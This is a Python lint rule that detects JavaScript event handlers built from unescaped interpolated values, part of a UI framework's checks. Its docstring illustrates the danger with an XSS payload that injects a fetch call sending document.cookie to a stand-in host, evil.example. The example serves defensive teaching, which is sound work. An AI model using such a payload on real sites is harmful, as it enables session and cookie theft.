"""Rule: a JavaScript ``on_*`` handler built from a value, unescaped.

``on_click="…"`` is JavaScript the developer writes, by design — the
browser's own ``onclick``, kept as the escape hatch (a string given to a
PROP is data, a string given to an ``on_*`` handler is code). The danger
is not the hatch, it is pasting a
VALUE into it::

    ui.button("Saluer", on_click=f"alert('Bonjour {eleve.nom}')")

A pupil named ``O'Brien`` closes the string — the button stops working —
and a name typed as ``'); fetch('https://evil.example?c=' + document.cookie); ('``
runs. The value becomes code, exactly as a value pasted into SQL.

The fix keeps the hatch : the value goes in as a JS string literal,
which ``json.dumps`` writes (quotes and backslashes escaped)::

    ui.button("Saluer", on_click=f"alert('Bonjour ' + {json.dumps(eleve.nom)})")

Reported : an ``on_*`` keyword whose value is an f-string, a ``+``
concatenation or a ``.format()`` that brings in something other than a
literal, ``json.dumps(…)``, ``escape_js(…)``, an ``int(…)``, a module
CONSTANT, a framework path (``binding_path()``, ``path_of(…)``) or a
client-state action (``state.x.set(…)``, which serializes its value).
"""

from __future__ import annotations

import ast
import re

from bretzel.lint.corpus import Module
from bretzel.lint.report import Finding

RULE = "interpolated-handler-script"

#: Calls whose result is safe inside JavaScript : a literal, a number, a
#: path the framework built, or a client-state action it serialized
#: (``state.x.set(v)`` writes ``v`` as a JS literal itself).
_SAFE_CALLS = frozenset({"dumps", "escape_js", "int", "float", "binding_path",
                         "path_of", "serialize_path", "set", "toggle",
                         "increment", "decrement", "push", "clear"})
#: A module CONSTANT (``SHEET``, ``_PANEL``): written in the code, not
#: read from a person.
_CONSTANT = re.compile(r"_?[A-Z][A-Z0-9_]*")


def _call_name(node: ast.AST) -> str | None:
    if isinstance(node, ast.Call):
        return getattr(node.func, "id", None) or getattr(node.func, "attr", None)
    return None


def _safe(node: ast.expr) -> bool:
    if isinstance(node, ast.Constant):
        return True
    if isinstance(node, ast.Name) and _CONSTANT.fullmatch(node.id):
        return True
    return _call_name(node) in _SAFE_CALLS


def _unsafe_parts(node: ast.expr) -> list[ast.expr]:
    """The pieces of a built string that bring in an unescaped value."""
    if isinstance(node, ast.JoinedStr):
        return [part.value for part in node.values
                if isinstance(part, ast.FormattedValue) and not _safe(part.value)]
    if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add):
        sides = (node.left, node.right)
        if not any(isinstance(s, (ast.Constant, ast.JoinedStr, ast.BinOp)) for s in sides):
            return []  # not a string being built
        found: list[ast.expr] = []
        for side in sides:
            if isinstance(side, (ast.JoinedStr, ast.BinOp)):
                found += _unsafe_parts(side)
            elif not _safe(side):
                found.append(side)
        return found
    if (isinstance(node, ast.Call) and _call_name(node) == "format"
            and isinstance(node.func, ast.Attribute)
            and isinstance(node.func.value, ast.Constant)):
        return [a for a in [*node.args, *(k.value for k in node.keywords)] if not _safe(a)]
    return []


def check(module: Module) -> list[Finding]:
    findings: list[Finding] = []
    for node in module.nodes:
        if not isinstance(node, ast.Call):
            continue
        for keyword in node.keywords:
            if not (keyword.arg and keyword.arg.startswith("on_")):
                continue
            parts = _unsafe_parts(keyword.value)
            if not parts:
                continue
            shown = ", ".join(ast.unparse(p) for p in parts)
            findings.append(
                Finding(
                    rule=RULE,
                    path=module.path,
                    line=keyword.value.lineno,
                    message=(
                        f"`{keyword.arg}=` builds JavaScript from a value ({shown}): "
                        "a quote in it breaks the handler, and a crafted one runs."
                    ),
                    hint=(
                        "Bring the value in as a JS string literal: "
                        "f\"alert('Bonjour ' + {json.dumps(value)})\". A number "
                        "goes through int(). Better still, a state action "
                        "(on_click=state.field.set(…)) or a Python handler."
                    ),
                )
            )
    return findings
